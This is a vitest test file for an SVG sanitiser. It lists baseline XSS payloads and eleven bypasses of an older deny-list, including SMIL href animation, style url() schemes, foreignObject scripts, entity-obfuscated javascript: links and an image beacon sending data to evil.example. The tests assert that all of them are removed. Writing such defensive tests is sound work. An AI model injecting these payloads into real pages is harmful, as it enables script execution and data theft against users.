// SPDX-License-Identifier: Apache-2.0
import { describe, it, expect } from "vitest";
import { sanitizeSvg } from "./sanitizeSvg";

// Baseline payloads (the original class of attack the sanitiser was written
// to block) plus the 11 bypasses that defeated the previous deny-list
// (SMIL animation, <style> url(), foreignObject, <use>, namespace-prefixed
// href, entity/whitespace scheme obfuscation, exfil beacons). Every payload
// must be fully neutralised by the allow-list.
const BASELINE_PAYLOADS = [
  '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1" onerror="alert(1)"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="1" height="1"/></a></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><iframe src="https://evil.example"></iframe></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1" onmouseover="a()" onfocus="b()" onclick="c()"/></svg>',
];

const BYPASS_PAYLOADS = [
  '<svg xmlns="http://www.w3.org/2000/svg"><a><animate attributeName="href" values="javascript:alert(1)" /></a></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><a><set attributeName="href" to="javascript:alert(1)" /></a></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><style>*{background:url("javascript:alert(1)")}</style></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1" style="fill:url(javascript:alert(1))"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4="/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="https://evil.example/x.svg#a"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/log?c=secret"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink"><use xl:href="javascript:alert(1)"/></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#9;script:alert(1)"><rect width="1" height="1"/></a></svg>',
  '<svg xmlns="http://www.w3.org/2000/svg"><a href="java&#10;script:alert(1)"><rect width="1" height="1"/></a></svg>',
];

describe("sanitizeSvg", () => {
  it("returns empty string for non-string / unparsable input", () => {
    expect(sanitizeSvg("")).toBe("");
    expect(sanitizeSvg(null)).toBe("");
    expect(sanitizeSvg("not xml <<<")).toBe("");
  });

  it("preserves legitimate presentation markup", () => {
    const clean = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10" fill="red"/></svg>';
    const out = sanitizeSvg(clean);
    expect(out).toContain("<rect");
    expect(out).toContain('fill="red"');
  });

  it.each(BASELINE_PAYLOADS)("neutralises baseline payload: %s", (payload) => {
    const out = sanitizeSvg(payload);
    expect(out.toLowerCase()).not.toContain("<script");
    expect(out.toLowerCase()).not.toContain("<iframe");
    expect(out.toLowerCase()).not.toMatch(/on[a-z]+\s*=/);
    expect(out.toLowerCase()).not.toContain("javascript:");
  });

  it.each(BYPASS_PAYLOADS)("neutralises previously-surviving bypass payload: %s", (payload) => {
    const out = sanitizeSvg(payload);
    const lower = out.toLowerCase();
    expect(lower).not.toContain("<script");
    expect(lower).not.toContain("<animate");
    expect(lower).not.toContain("<set");
    expect(lower).not.toContain("<style");
    expect(lower).not.toContain("<foreignobject");
    expect(lower).not.toContain("<use");
    expect(lower).not.toContain("javascript:");
    expect(lower).not.toContain("href="); // no href/xlink:href/xl:href survives at all
    expect(lower).not.toContain("evil.example");
  });
});
